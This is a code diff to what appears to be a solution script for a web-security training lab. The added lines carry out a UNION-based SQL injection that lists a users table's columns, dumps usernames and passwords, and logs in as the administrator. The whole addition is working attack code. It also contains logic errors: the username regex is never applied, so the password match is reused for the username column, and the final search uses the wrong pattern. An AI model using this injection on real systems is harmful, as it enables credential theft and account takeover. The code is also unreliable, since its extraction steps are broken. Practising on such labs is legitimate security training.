@@ -40,6 +40,34 @@ def main(args):
     m = pattern.search(resp.text)
     users_table = m[1]
     log.info(f"Found users table: {users_table}")
+    log.info("Getting columns from table.")
+    nulls = ["NULL"] * num_columns
+    nulls[text_columns[0]] = "column_name"
+    nulls = ",".join(nulls)
+    resp = shop.get_category(
+        f"' UNION SELECT {nulls} from information_schema.columns where table_name = '{users_table}'-- "
+    )
+    #passwords
+    pattern = re.compile(r"<th>(password_.*?)</th>")
+    m = pattern.search(resp.text)
+    password_column = m[1]
+    #username
+    pattern = re.compile(r"<th>(username_.*?)</th>")
+    username_column = m[1]
+    log.info(f"Got username and pw columns: {username_column}, {password_column}")
+    log.info("Getting usernames and pw from db")
+    nulls = ["NULL"] * num_columns
+    nulls[text_columns[0]] = username_column
+    nulls[text_columns[1]] = password_column
+    nulls = ",".join(nulls)
+    resp = shop.get_category(f"' UNION SELECT {nulls} from {users_table}-- ")
+    m = re.search(pattern, resp.text, flags=re.M | re.DOTALL)
+    password = m[1]
+    log.info(f"Got admin's pw: {password}")
+    shop.login("administrator", password)
+    shop.is_solved()
+    
+    
 if __name__ == "__main__":
     args=utils.parse_args(sys.argv)
     main(args)
